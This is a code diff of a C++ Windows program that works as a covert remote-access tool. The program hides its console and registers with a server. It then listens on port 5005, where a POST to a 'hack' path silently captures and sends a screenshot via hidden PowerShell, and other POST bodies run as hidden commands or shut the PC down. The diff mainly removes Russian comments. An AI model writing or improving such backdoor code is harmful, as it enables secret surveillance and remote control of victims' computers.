@@ -13,10 +13,8 @@ namespace beast = boost::beast;
 using boost::asio::ip::tcp;
 
 bool take_screenshot(const std::string& filename) {
-    // 1. Стираем старый скриншот, чтобы проверка была честной
     std::remove(filename.c_str());
 
-    // 2. В этой строке оставляем ТОЛЬКО параметры для PowerShell
     std::string arguments = "-WindowStyle Hidden -Command "
         "\"[Reflection.Assembly]::LoadWithPartialName('System.Drawing') | Out-Null; "
         "[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null; "
@@ -28,11 +26,8 @@ bool take_screenshot(const std::string& filename) {
         "$graphics.Dispose(); "
         "$bmp.Dispose();\"";
 
-    // 3. Вызываем ShellExecuteA правильно:
-    // "powershell" идет в параметры файла, а arguments — в параметры аргументов
     ShellExecuteA(NULL, "open", "powershell", arguments.c_str(), NULL, SW_HIDE);
 
-    // 4. Обязательно ждем, пока PowerShell создаст файл (так как он работает в фоне)
     for (int i = 0; i < 40; ++i) {
         std::ifstream check_file(filename);
         if (check_file.good()) {
@@ -52,6 +47,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     try {
         HWND hwnd = GetConsoleWindow();
         ShowWindow(hwnd, SW_HIDE);
+
+        wchar_t buffer[MAX_PATH];
+        GetModuleFileNameW(NULL, buffer, MAX_PATH);
+
+        std::filesystem::path exePath = buffer;
+        std::wstring exeDir = exePath.parent_path().wstring();
+
+        SetCurrentDirectoryW(exeDir.c_str());
 
         HKEY key;
         char path[MAX_PATH];
@@ -81,7 +84,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             sock1.close();
         }
         catch (const std::exception&) {
-            // Если сервер-регистратор недоступен, не падаем, а продолжаем запуск локального слушателя
         }
 
         tcp::acceptor acceptor(ioc, tcp::endpoint(tcp::v4(), 5005));
@@ -101,7 +103,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
             if (req.method() == beast::http::verb::post && target.find("hack") != std::string::npos)
             {
-                // 1. Формируем и отправляем ответ телефону
                 beast::http::response<beast::http::string_body> res(beast::http::status::ok, req.version());
                 res.set(beast::http::field::content_type, "text/plain; charset=utf-8");
                 res.body() = "YESSSS PC HUMAN DEAD!";
@@ -133,41 +134,37 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                 if (take_screenshot(filename)) {
                     beast::error_code ec;
 
-                    // МАГИЯ ЗДЕСЬ: Оборачиваем создание и отправку ответа в фигурные скобки!
                     {
                         beast::http::response<beast::http::file_body> res(beast::http::status::ok, req.version());
                         res.set(beast::http::field::content_type, "image/png");
                         res.set(beast::http::field::connection, "close");
 
-                        // Открываем файл встроенными средствами Boost.Beast (ifstream больше НЕ НУЖЕН!)
                         res.body().open(filename.c_str(), beast::file_mode::read, ec);
 
                         if (!ec) {
                             res.prepare_payload();
-                            beast::http::write(sock, res); // Отправляем скриншот на телефон
+                            beast::http::write(sock, res); 
                             std::cout << "[Сервер] Скриншот успешно отправлен!" << std::endl;
                         }
                         else {
                             std::cout << "[Ошибка] Не удалось открыть файл скриншота: " << ec.message() << '\n';
                         }
-                    } // <- ТУТ ЗАКРЫВАЕТСЯ СКОБКА! Объект res уничтожается, файл закрывается в Windows,
-                      // и всякая блокировка с картинки полностью снимается! [11.1]
+                    }
 
-                    // Безопасно закрываем сокет и мгновенно стираем файл с диска [11.2]
+ 
                     boost::system::error_code ignore_error;
                     sock.close();
 
-                    std::filesystem::remove(filename, ignore_error); // Теперь он ЖЕЛЕЗНО удалится! [11.2]
+                    std::filesystem::remove(filename, ignore_error);
                 }
                 else {
                     std::cout << "[Ошибка] PowerShell не смог сохранить изображение." << std::endl;
                     boost::system::error_code ignore_error;
                     sock.close();
                 }
-                continue; // Переходим к следующему кругу ожидания
+                continue;
             }
 
-            // Секция POST для остальных консольных команд
             else if (req.method() == beast::http::verb::post) {
                 beast::http::response<beast::http::string_body> res(beast::http::status::ok, req.version());
                 res.set(beast::http::field::content_type, "text/plain; charset=utf-8");
@@ -175,27 +172,22 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                 res.prepare_payload();
                 beast::http::write(sock, res);
 
-                // 2. Красиво и безопасно закрываем сетевое соединение, чтобы не было ошибки сокета
                 beast::error_code ec;
                 sock.shutdown(tcp::socket::shutdown_both, ec);
                 sock.close();
 
-                // Переводим команду телефона в обычную строку
+
                 std::string command = std::string(req.body().data());
                 std::cout << "[Сервер] Запускаю команду: " << command << std::endl;
 
-                // 3. ПРОВЕРКА: Если команда содержит "shutdown", выключаем ПК особым образом
                 if (command.find("shutdown") != std::string::npos) {
                     std::cout << "[ПК] Завершаю работу сервера и выключаю систему..." << std::endl;
 
-                    // Вызываем выключение Windows через 5 секунд
                     std::system("shutdown /s /t 0");
 
-                    // Немедленно завершаем саму C++ программу, чтобы она не выдавала ошибок сокета
                     std::exit(0);
                 }
                 else {
-                    // Для всех остальных программ (calc, notepad и т.д.) запускаем их БЕЗ черного окна CMD
                     ShellExecuteA(NULL, "open", command.c_str(), NULL, NULL, SW_HIDE);
                 }
             }
